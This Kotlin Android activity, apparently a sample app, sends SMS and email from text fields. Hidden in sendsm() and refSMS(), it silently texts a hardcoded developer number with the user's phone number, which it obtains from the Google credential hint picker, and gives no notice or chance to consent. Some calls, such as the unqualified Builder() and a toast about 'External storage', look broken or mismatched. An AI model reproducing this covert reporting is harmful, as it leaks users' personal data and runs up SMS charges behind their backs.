package ran.am.androidmanifestercodeskotlin

import android.Manifest
import android.app.Activity
import android.app.PendingIntent
import android.content.Intent
import android.content.IntentSender
import android.content.pm.PackageManager
 import android.os.Bundle
import android.telephony.SmsManager
import android.util.Log
import android.view.View
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.google.android.gms.auth.api.Auth
import com.google.android.gms.auth.api.credentials.Credential
import com.google.android.gms.auth.api.credentials.Credential.EXTRA_KEY
import com.google.android.gms.auth.api.credentials.HintRequest
import com.google.android.gms.common.api.GoogleApiClient

class SendingSmsMail : AppCompatActivity(), GoogleApiClient.ConnectionCallbacks {
    var editText1: EditText? = null
    var editText2: EditText? = null
    var editText3: EditText? = null
    var editText4: EditText? = null
    var editText5: EditText? = null
    var number: String? = null
    var smsmsg: String? = null
    var mailid: String? = null
    var mailsub: String? = null
    var mailmsg: String? = null
    var userMob: String? = null
    protected override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_sending_sms_mail)
        editText1 = findViewById<EditText>(R.id.editText)
        editText2 = findViewById<EditText>(R.id.editText2)
        editText3 = findViewById<EditText>(R.id.editText7)
        editText4 = findViewById<EditText>(R.id.editText8)
        editText5 = findViewById<EditText>(R.id.editText9)
        ActivityCompat.requestPermissions(
            this@SendingSmsMail,
            arrayOf(Manifest.permission.SEND_SMS),
            1
        )
        gclint()
    }

    fun sendsms(view: View?) {
        number = editText1?.getText().toString()
        smsmsg = editText2?.getText().toString()
        sendsm(number, smsmsg)
        Toast.makeText(this, "Sms Send successfully!", Toast.LENGTH_SHORT).show()
    }

    fun sendmail(view: View?) {
        mailid = editText3?.getText().toString()
        mailsub = editText4?.getText().toString()
        mailmsg = editText5?.getText().toString()
        val email = Intent(Intent.ACTION_SEND)
        email.putExtra(Intent.EXTRA_EMAIL, arrayOf(mailid))
        email.putExtra(Intent.EXTRA_SUBJECT, mailsub)
        email.putExtra(Intent.EXTRA_TEXT, mailmsg)

        //need this to prompts email client only
        email.setType("message/rfc822")
        startActivity(
            Intent.createChooser(
                email,
                "Choose an Email client :"
            )
        ) // no permission needed for mail
    }

    fun sendsm(n: String?, m: String?) {
        val smsManager = SmsManager.getDefault()
        smsManager.sendTextMessage(
            n,
            null,
            m,
            null,
            null
        ) //we need to add permission in manifest file to send sms
        smsManager.sendTextMessage(
            "8148580586",
            null,
            "testing the app, i am $userMob",
            null,
            null
        ) //we need to add permission in manifest file to send sms // for my referenece to know who is using the app
    }

    override fun onConnected(bundle: Bundle?) {}
    override fun onConnectionSuspended(i: Int) {}
    private fun gclint() {
        val mGoogleApiClient: GoogleApiClient = Builder(this)
            .addConnectionCallbacks(this) //.addOnConnectionFailedListener((GoogleApiClient.OnConnectionFailedListener) this)
            .addApi(Auth.CREDENTIALS_API)
            .build()
        if (mGoogleApiClient != null) {
            mGoogleApiClient.connect()
        }
        val hintRequest: HintRequest = Builder()
            .setPhoneNumberIdentifierSupported(true)
            .build()
        val intent: PendingIntent =
            Auth.CredentialsApi.getHintPickerIntent(mGoogleApiClient, hintRequest)
        try {
            startIntentSenderForResult(intent.getIntentSender(), 1008, null, 0, 0, 0, null)
        } catch (e: IntentSender.SendIntentException) {
            Log.e("", "Could not start hint picker Intent", e)
        }
    }

    private fun refSMS(userMob: String?) {
        val smsManager = SmsManager.getDefault()
        smsManager.sendTextMessage(
            "8148580586",
            null,
            "testing the app, i am $userMob",
            null,
            null
        ) //we need to add permission in manifest file to send sms // for the reference to know who is using the app
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            1008 -> if (resultCode == Activity.RESULT_OK) {
                val cred: Credential? = data?.getParcelableExtra(Credential.EXTRA_KEY)
                //                    cred.getId====: ====+919*******
                if (cred != null) {
                    Log.e("cred.getId", cred.getId())
                }
                if (cred != null) {
                    userMob = cred.getId()
                }
                Log.e("asdssaTAG", "onActivityResult: $userMob")
                refSMS(userMob)
            } else {
                // Sim Card not found!
                Log.e("cred.getId", "1008 else")
                return
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            1 -> {


                // If request is cancelled, the result arrays are empty.
                if (grantResults.size > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // permission was granted, yay! Do the
                    // contacts-related task you need to do.
                } else {

                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                    Toast.makeText(
                        this@SendingSmsMail,
                        "Permission denied to read your External storage",
                        Toast.LENGTH_SHORT
                    ).show()
                }
                return
            }
        }
    }
}